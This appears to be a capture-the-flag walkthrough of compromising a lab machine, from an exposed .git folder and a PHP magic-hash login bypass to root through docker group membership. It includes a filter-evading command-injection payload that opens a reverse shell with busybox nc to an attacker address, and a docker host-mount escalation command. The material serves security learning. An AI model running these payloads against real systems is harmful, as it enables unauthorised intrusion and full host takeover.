    1. Initial Reconnaissance

    Nmap Scan

    An initial Nmap scan revealed the following open ports:

    PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

    • Port 22: SSH is available, likely used for remote management.

    • Port 80: A web server is hosted here.

    • Port 8080: Often used for admin panels, APIs, or alternative web interfaces.

    This suggested that HTTP-based enumeration would be a good starting point.

    2. Web Enumeration

    Using directory brute-forcing, a .git folder was discovered and found to be fully browsable:

    200 - /.git/
200 - /.git/config
200 - /.git/index
200 - /.git/logs/refs/heads/master
200 - /.git/refs/heads/master
...

    This is a critical misconfiguration: the .git folder contains the entire version control history and project files, allowing full source code recovery.

    Additional files and directories found:

    • /README.md: May contain developer notes.

    • /database.php: Might contain DB credentials.

    • /index.html: Likely the main landing page.

    • /server-status: Blocked but indicates Apache is in use.

    3. Git Repository Dump and Analysis

    Using git-dumper, the entire Git repository was cloned:

    git-dumper http://192.168.157.135/.git ./dumped-repo

    This yielded two particularly important files:

    • login.php: Contains logic for the login mechanism.

    • init.sql: Contains SQL statements with hardcoded user credentials.

    4. Information from README.md

    The README.md file contains the following development notes:

    - Added staff vhost
- Removed juicy files from git repo
- Implemented blacklist & whitelist filters to prevent remote code execution reported by the last penetration test performed on our platform

TODO:
- Change weak password
- Remove commands from the whitelist like "cut" which are not needed anymore
- Fix StrictModes ssh_config

    Key takeaways:

    • A new virtual host was added (staff), likely on port 8080.

    • There were attempts to mitigate RCE via command filtering.

    • At least one weak password exists and is still in use.

    5. Authentication Bypass via MD5 Magic Hash

    login.php Analysis

    if (!$user || (md5($password) != $user['password'])) {
    $msg = 'Credenziali utente errate %s';
}

    This shows the application uses MD5 to validate passwords. This is insecure because PHP treats strings starting with 0e as scientific notation, which evaluates to 0.

    init.sql

    INSERT INTO staff(username, email, password) VALUES("lu191", "lu191@develop.info", "0e987654321098765432109876543210");

    This password hash is vulnerable to a magic hash attack. The value 0e987654321098765432109876543210 is interpreted as 0 in PHP, allowing a password like:

    Username: lu191
Password: 240610708

    This bypasses the login check due to type juggling.

    6. Remote Code Execution via Ping Feature

    After logging into the staff portal on port 8080, a "Ping" feature was available. Testing showed that this input field was vulnerable to command injection.

    Input Filtering Observed

    Blocked characters:

    • /

    • (

    • )

    • $

    • |

    • Spaces

    This suggested that traditional payloads using ;, &&, or pipelines would not work directly.

    Bypassing the Filters

    • Used %0a to inject a newline.

    • Used %09 (tab) instead of space.

    • Used busybox and nc to initiate a reverse shell.

    Payload:

    127.0.0.1%0abusybox%09nc%09192.168.45.X%0980%09-e%09bash

    After submitting the payload, a reverse shell was received on the listener.

    7. Post-Exploitation and Enumeration

    Running linpeas.sh on the machine revealed:

    • A private SSH key for user franz.

    • franz is part of the docker group.

    SSH Login

    Extracted the private key and logged in as franz:

    ssh -i franz_id_rsa franz@192.168.157.135

    8. Docker Group Abuse to Gain Root Access

    Being in the docker group allows for root privilege escalation if any image is available. This is because Docker containers can mount the host filesystem and chroot into it.

    Listing Docker Images

    docker image ls

    Found:

    REPOSITORY   TAG     IMAGE ID       CREATED        SIZE
mysql        8.0.22  d4c3cafb11d5   4 years ago    545MB

    Spawning a Container with Host Mount

    docker run -it --rm -v /:/mnt d4c3cafb11d5 chroot /mnt bash

    This launches a container, mounts the host filesystem, and chroots into it, effectively giving root access on the host.

    9. Root Access

    We are now root on the host system:

    root@e5f275ea14d3:/# ls
docker-compose.yml  proof.txt  snap
